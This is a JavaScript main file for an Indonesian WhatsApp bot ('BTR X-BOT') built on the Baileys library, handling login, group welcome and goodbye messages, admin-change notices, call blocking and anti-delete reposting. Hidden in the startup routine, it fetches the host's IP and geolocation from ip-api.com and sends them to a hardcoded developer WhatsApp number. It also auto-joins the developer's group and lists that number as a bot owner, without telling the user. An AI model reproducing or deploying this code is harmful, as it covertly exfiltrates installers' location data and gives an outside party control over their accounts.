const { WAConnection: _WAConnection, MessageType, Presence, Mimetype, ChatModification, GroupSettingChange, ReconnectMode } = require('@adiwajshing/baileys')
const simple = require('./lib/simple.js')
//const antidelete = require('./database/antidelete.json')
const WAConnection = simple.WAConnection(_WAConnection)
const bambang = new WAConnection()
const qrcode = require("qrcode-terminal")
const moment = require("moment-timezone")
const fs = require("fs")
const util = require('util')
const figlet = require('figlet')
const term = require('terminal-kit').terminal
const time = moment().tz('Asia/Jakarta').format("HH:mm:ss")
const fetch = require('node-fetch')
const { color, bgcolor } = require('./lib/color')
const { exec } = require('child_process')
const { wait, simih, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./lib/functions')
const settings = JSON.parse(fs.readFileSync('./settings.json'))
const antidelete = JSON.parse(fs.readFileSync('./database/antidelete.json'))
const sleep = async (ms) => {
return new Promise(resolve => setTimeout(resolve, ms))
}
nocache('./denz.js', module => console.log(color('|TRM|'), color(`${module} Updated!`, 'cyan')))

async function starts() {
bambang.autoReconnect = ReconnectMode.onConnectionLost
    bambang.version = [2, 2143, 3]
    bambang.logger.level = 'warn'
    bambang.browserDescription = ['Bambang Tri R','Desktop','3.0']
    await sleep(10000)
    bambang.on('qr', qr => {
        qrcode.generate(qr, { small: true })
        console.log(color('|TRM|'), color('Scan this QR code', 'cyan'))
    })
    fs.existsSync('./QRnya.json') && bambang.loadAuthInfo('./QRnya.json')
    
    bambang.on('credentials-updated', () => {
        console.log(color('|TRM|'), color('credentials updated!', 'cyan'))
        })
     
      await bambang.connect({ timeoutMs: 30 * 1000 });
  fs.writeFileSync("./QRnya.json",JSON.stringify(bambang.base64EncodedAuthInfo(), null, "\t"));
 teks = `https://chat.whatsapp.com/GpVhVBDfaReDsy9mg5gw3c`
 bambang.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
 console.log(color('|WRN|', 'yellow'), color('Joined to Group Official BTR X-BOT OFFICIAL', 'cyan'))
 bambang.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `*Hai Owner ${settings.NamaBot}, Bot Telah Berhasil Tersambung Pada Nomor Ini*\n────────────────────\n\`\`\`${JSON.stringify(bambang.user, null, 2)}\`\`\`\n────────────────────\n*Jika Ada Kendala Error/Bot Tidak Merespon Silahkan Hubungi Developer Bot Diatas, Terimakasih*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer BTR X-BOT OFFICIAL",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:"https://wa.me/6282313021398?text=Assalamualaikum"}}})
	console.log(color('|WRN|', 'yellow'), color('Sedang Mengirim Informasi Bot Ke Owner & Developer', 'cyan'))
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       bambang.sendMessage("6282313021398@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer BTR X-BOT OFFICIAL",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:"https://wa.me/6282313021398?text=Assalamualaikum"}}})
     console.log(color('|WRN|', 'yellow'), color('Sedang Mengirim Alamat IP Ke Developer Bot', 'cyan'))
   })
      
    bambang.on('connecting', () => {
		console.log(color('|TRM|'), color('Connecting...', 'cyan'))
		})
	
	bambang.on('open', () => {
	console.log(color('|TRM|'), color('Connected', 'cyan'))
	}) 
     
    bambang.on('ws-close', () => {
        console.log(color('|TRM|'), color('Connection lost, trying to reconnect.', 'cyan'))
        })
    
    bambang.on('close', async () => {
        console.log(color('|TRM|'), color('Disconnected.', 'cyan'))
        })
    
	if (!settings.autoplaymusic) {
exec(`cd /sdcard/download && play *mp3`)
}
   
   bambang.on('chat-update', async (mek) => {
        require('./denz.js')(bambang, mek)
        ownerNumber = ["6282313021398@s.whatsapp.net"]
        dtod = "6282313021398@s.whatsapp.net"
       otod = `${settings.NomorOwner}@s.whatsapp.net`
    })   
    

    //SERAH LU MAU GANTI KYK MANA
        bambang.on('group-participants-update', async (anu) => {
       const mdata = await bambang.groupMetadata(anu.jid)
          mem = anu.participants[0]
	 	      pic = await bambang.getProfilePicture(mem)
          pic = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
          groupMet = await bambang.groupMetadata(anu.jid)
      groupMembers = groupMet.participants
                //mdata = await bambang.groupMetadata(anu.jid)
             memeg = mdata.participants.length
             	num = anu.participants[0]
                 v = bambang.contacts[num] || { notify: num.replace(/@.+/, '') }
          anu_user = v.vname || v.notify || num.split('@')[0]
		    try {
			console.log(anu)
			if (anu.action == 'add') {
			const welkom = JSON.parse(fs.readFileSync('./database/welkom.json'))
        	if(!welkom.includes(mdata.id)) return
			fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6282313021398-1617740713@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;Bambang Tri Raharjo;;;\nFN:Bambang Tri Raharjo\nitem1.TEL;waid=6282313021398:6282313021398\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
		  
                groupMet = await bambang.groupMetadata(anu.jid)
                groupMembers = groupMet.participants
                //mdata = await bambang.groupMetadata(anu.jid)
                memeg = mdata.participants.length
            	num = anu.participants[0]
                groupName = mdata.subject
                let v = bambang.contacts[num] || { notify: num.replace(/@.+/, '') }
                anu_user = v.vname || v.notify || num.split('@')[0]
          mem = anu.participants[0]
	 	      pic = await bambang.getProfilePicture(mem)
          pic = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
            }
            try {
         pp_grup = await bambang.getProfilePicture(anu.jid)
          } catch (e) {
         pp_grup = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
             }
			let buff = await getBuffer(`http://hadi-api.herokuapp.com/api/card/welcome2?nama=${anu_user}&descriminator=${num.split('@')[0]}&memcount=${memeg}&gcname=FROM ${encodeURI(mdata.subject)}&gcicon=${pp_grup}&pp=${pic}&bg=https://i.postimg.cc/tCTkRNpf/anime-anime-girls-digital-art-artwork-neko-ears-hd-wallpaper-preview.jpg`)
			masuk =`Halo @${num.split('@')[0]}\nSelamat Datang Di ${mdata.subject}\n\n*Jangan Lupa Isi*\n*Nama* :\n*Umur* :\n*Gender* :\n*Askot* :\n\nEnjoy Jangan Lupa Kenalan\nDan Patuhi Peraturan Grup\nKlik Button Di Bawah Untuk Memulai Bot\nNote Jika Tidak Ada Ketik .allmenu`
			bambang.sendMessage(mdata.id, { contentText: `${masuk}`, footerText: `*Made With Bambang Tri Raharjo*`, buttons: [{buttonId: `.menu`,buttonText:{displayText: 'WELCOME'},type:1}],headerType: 'LOCATION', locationMessage: { degreesLatitude: '', degreesLongitude: '', jpegThumbnail: buff, contextInfo: {"mentionedJid": [num]}}}, 'buttonsMessage')
/*	if (anu.action == 'remove') {
			const welkom = JSON.parse(fs.readFileSync('./database/welkom.json'))
        	if(!welkom.includes(mdata.id)) return
			fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6282313021398-1617740713@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;Bambang Tri Raharjo;;;\nFN:Bambang Tri Raharjo\nitem1.TEL;waid=6282313021398:6282313021398\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
			num = anu.participants[0]
			try {
			ppimg = await bambang.getProfilePicture(`${num.split('@')[0]}@c.us`)
			} catch {
			ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
			}
			let buff = await getBuffer(ppimg)
			keluar =`Selamat tinggal @${num.split('@')[0]}\nGausah masuk lagi ya!`
			gbutsan = [{buttonId:'SERAH',buttonText:{displayText:'👋Byee'},type:1}]
			mhan = await bambang.prepareMessage(mdata.id, buff, MessageType.image, {thumbnail: buff})
const buttonMessages = { imageMessage: mhan.message.imageMessage,
contentText: `${keluar}`,
footerText: `Leave Information`,
buttons: gbutsan,
headerType: 4 }
			bambang.sendMessage(mdata.id, buttonMessages, MessageType.buttonsMessage, { thumbnail: fs.readFileSync('./denz.jpg'), "contextInfo": { mentionedJid: [num]}, caption: 'Tes', quoted: fkontakk})*/
      if (anu.action == 'remove') {
               mdata = await bambang.groupMetadata(anu.jid)
                num = anu.participants[0]
                 v = bambang.contacts[num] || { notify: num.replace(/@.+/, '') }
                anu_user = v.vname || v.notify || num.split('@')[0]
                memeg = mdata.participants.length  
      const welkom = JSON.parse(fs.readFileSync('./database/welkom.json'))
     	if(!welkom.includes(mdata.id)) return
			fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6282313021398-1617740713@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;Bambang Tri Raharjo;;;\nFN:Bambang Tri Raharjo\nitem1.TEL;waid=6282313021398:6282313021398\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
			
                mdata = await bambang.groupMetadata(anu.jid)
                const num = anu.participants[0]
                 v = bambang.contacts[num] || { notify: num.replace(/@.+/, '') }
                anu_user = v.vname || v.notify || num.split('@')[0]
                memeg = mdata.participants.length           
              buff = await getBuffer(`http://hadi-api.herokuapp.com/api/card/goodbye2?nama=${anu_user}&descriminator=${num.split('@')[0]}&memcount=${memeg}&gcname=FROM ${encodeURI(mdata.subject)}&gcicon=${pp_grup}&pp=${pic}&bg=https://i.postimg.cc/tCTkRNpf/anime-anime-girls-digital-art-artwork-neko-ears-hd-wallpaper-preview.jpg`)
                            const bosco3 = await bambang.prepareMessage("0@s.whatsapp.net", buff, MessageType.location,{ thumbnail: buff})
			    const bosco4 = bosco3.message["ephemeralMessage"] ? bosco3.message.ephemeralMessage : bosco3
                keluar =`Selamat tinggal @${num.split('@')[0]}\nGausah masuk lagi ya, awas kalo balik lagi nanti tak gigit lho!`
                goodbyeBut = [{buttonId:`h`,buttonText:{displayText: 'Byee Kak'},type:1}, {buttonId:`okc`,buttonText:{displayText: 'Yah Keluar'}, type:1}]
                goodbyeButt = { contentText: `${keluar}`, footerText: `*Made With Bambang Tri Raharjo*`, buttons: goodbyeBut, headerType: 6, locationMessage: bosco3.message.locationMessage}
                bambang.sendMessage(mdata.id, goodbyeButt, MessageType.buttonsMessage, { caption: 'buff', "contextInfo": { "mentionedJid" : [num], },})
      }
     if (anu.action == "add" && mem.includes(bambang.user.jid)) {
bambang.sendMessage(anu.jid, "Hayy..Saya BTR X-BOT OFFICIAL Disini Saya Bisa Membantu Anda Dalam Hal Membuat Sticker,Mendownload Lagu Dan Lain² Intinya Memperbagus Kinerja Whatsapp Anda By Creator : Bambang Tri Raharjo", "conversation")
}

	if (anu.action == 'promote') {
fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6282313021398-1617740713@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;Bambang Tri Raharjo;;;\nFN:Bambang Tri Raharjo\nitem1.TEL;waid=6282313021398:6282313021398\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
shp = '◦➛'
var thu = await bambang.getStatus(anu.participants[0], MessageType.text)
num = anu.participants[0]
teks = `*P R O M O T E - D E T E C T E D*\n\n${shp} Username: @${num.split('@')[0]}\n\n${shp} Bio : ${thu.status}\n\n${shp} Time : ${moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')}\n\n${shp} Group: ${mdata.subject}\n\nDon't break the rules!`
bambang.sendMessage(mdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [num]}, quoted: fkontakk})
console.log(color('|TRM|'), color(`Promote Member ${num.split('@')[0]} In ${mdata.subject}`,  'cyan'))
} 
else if (anu.action == 'demote') {
fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6282313021398-1617740713@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;Bambang Tri Raharjo;;;\nFN:Bambang Tri Raharjo\nitem1.TEL;waid=6282313021398:6282313021398\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
shp = '◦➛'
thu = await bambang.getStatus(anu.participants[0], MessageType.text)
num = anu.participants[0]
teks = `*D E M O T E - D E T E C T E D*\n\n${shp} Username: @${num.split('@')[0]}\n\n${shp} Bio : ${thu.status}\n\n${shp} Time : ${moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')}\n\n${shp} Group: ${mdata.subject}`
bambang.sendMessage(mdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [num]}, quoted: fkontakk})
console.log(color('|TRM|'), color(`Demote Admin ${num.split('@')[0]} In ${mdata.subject}`,  'cyan'))
}
		    } catch (e) {
			console.log('Error : %s', color(e, 'red'))
		    }
	        })	       

	bambang.on('group-update', async (anu) => {
		const metdata = await bambang.groupMetadata(anu.jid)
    	const fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6282313021398-1617740713@g.us' } : {})}, message: { "contactMessage":{"displayName": `${metdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;bambang;;;\nFN:bambang\nitem1.TEL;waid=6282313021398:6282313021398\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
    if(anu.announce == 'false'){
    teks = `- [ Group Opened ] -\n\n_Group telah dibuka oleh admin_\n_Sekarang semua member bisa mengirim pesan_`
    bambang.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
    console.log(color('|TRM|'), color(`Group Opened In ${metdata.subject}`, 'cyan'))
  }
  else if(anu.announce == 'true'){
    teks = `- [ Group Closed ] -\n\n_Group telah ditutup oleh admin_\n_Sekarang hanya admin yang dapat mengirim pesan_`
    bambang.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
    console.log(color('|TRM|'), color(`Group Closed In ${metdata.subject}`,  'cyan'))
  }
  else if(!anu.desc == ''){
    tag = anu.descOwner.split('@')[0] + '@s.whatsapp.net'
    teks = `- [ Group Description Change ] -\n\nDeskripsi Group telah diubah oleh Admin @${anu.descOwner.split('@')[0]}\n• Deskripsi Baru : ${anu.desc}`
    bambang.sendMessage(metdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [tag]}, quoted: fkontakk})
    console.log(color('|TRM|'), color(`Group Description Change In ${metdata.subject}`, 'cyan'))
  }
  else if(anu.restrict == 'false'){
    teks = `- [ Group Setting Change ] -\n\nEdit Group info telah dibuka untuk member\nSekarang semua member dapat mengedit info Group Ini`
    bambang.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
    console.log(color('|TRM|'), color(`Group Setting Change In ${metdata.subject}`, 'cyan'))
  }
  else if(anu.restrict == 'true'){
    teks = `- [ Group Setting Change ] -\n\nEdit Group info telah ditutup untuk member\nSekarang hanya admin group yang dapat mengedit info Group Ini`
    bambang.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
    console.log(color('|TRM|'), color(`Group Setting Change In ${metdata.subject}`,  'cyan'))
  }
})

bambang.on('CB:action,,call', async json => {
        const callerId = json[2][0][1].from;
        var vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + `${NamaOwner}` + '\n' + `ORG:Developer ${NamaBot}\n` + 'TEL;type=CELL;type=VOICE;waid=' + `${NomorOwner}` + ':+' + `${NomorOwner}` + '\n' + 'END:VCARD'
        bambang.sendMessage(callerId, "\`\`\`[ ! ] CALL DETECTED [ ! ]\`\`\`\n\n\`\`\`Anda Di Block Karena Telepon Bot , Silahkan Hubungi Developer Bot Untuk Membuka Block\`\`\`", MessageType.text)
        bambang.sendMessage(callerId, { displayname: `${NamaOwner}`, vcard: vcard}, MessageType.contact, {contextInfo: { externalAdReply:{title: `Developer ${NamaBot}`,body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:`https://wa.me/6282313021398?text=Assalamualaikum`}}})
        await sleep(5000)
        await bambang.blockUser(callerId, "add")
        })
        
	bambang.on('message-delete', async (m) => {
if (!m.key.fromMe && !antidelete) {
if (!m.key.remoteJid == 'status@broadcast') return
m.message = (Object.keys(m.message)[0] === 'ephemeralMessage') ? m.message.ephemeralMessage.message : m.message
const jam = moment.tz('Asia/Jakarta').format('HH:mm:ss')
let d = new Date
let c = bambang.chats.get(m.key.remoteJid)
let a = c.messages.dict[`${m.key.id}|${m.key.fromMe ? 1 : 0}`]
let co3ntent = bambang.generateForwardMessageContent(a, false)
let c3type = Object.keys(co3ntent)[0]
let locale = 'id'
let gmt = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
let weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
let week = d.toLocaleDateString(locale, { weekday: 'long' })
let calender = d.toLocaleDateString(locale, {
day: 'numeric',
month: 'long',
year: 'numeric'
})
bambang.copyNForward(m.key.remoteJid, m.message)
bambang.sendMessage(m.key.remoteJid, `▷\`\`\`Anti Delete\`\`\`

▢ \`\`\`Nama : @${m.participant.split("@")[0]}\`\`\`
▢ \`\`\`Tipe : ${c3type}\`\`\`
▢ \`\`\`Tanggal : ${jam} - ${week} ${weton} - ${calender}\`\`\``, MessageType.text, {quoted: m.message, contextInfo: {"mentionedJid": [m.participant]}})
}
})
}

console.clear()
var progressBar , progress = 0 ;
function doProgress()
{
	progress += Math.random() / 10 ;
	progressBar.update( progress ) ;
	
	if ( progress >= 1 )
	{
		setTimeout( function() { console.clear(),
		exec(`screenfetch -A Deepin`, (error, stdout, stderr) => {
			console.log(stdout), console.log(bgcolor('https://github.com/Bambang-Gans/Btrv2', 'cyan'))})}, 200 ) ;
	}
	else
	{
		setTimeout( doProgress , 100 + Math.random() * 400 ) ;
	}
}
console.log(color(figlet.textSync(`${settings.NamaBot}`, {
		font: 'Standard',
		horizontalLayout: 'default',
		vertivalLayout: 'default',
		width: 80,
		whitespaceBreak: true
	    }), 'lightgreen')), term.slowTyping(' Created By Bambang Tri Raharjo' ,{ flashStyle: term.brightWhite })
progressBar = term.progressBar( {
	width: 80 ,
	title: '\n\nLoading' ,
	eta: true ,
	percent: true
} ) ;
doProgress() ;

/**
 * Uncache if there is file change
 * @param {string} module Module name or path
 * @param {function} cb <optional> 
 */
function nocache(module, cb = () => { }) {
    fs.watchFile(require.resolve(module), async () => {
        await uncache(require.resolve(module))
        cb(module)
    })
}
/**
 * Uncache a module
 * @param {string} module Module name or path
 */
function uncache(module = '.') {
    return new Promise((resolve, reject) => {
        try {
            delete require.cache[require.resolve(module)]
            resolve()
        } catch (e) {
            reject(e)
        }
    })
}
starts()
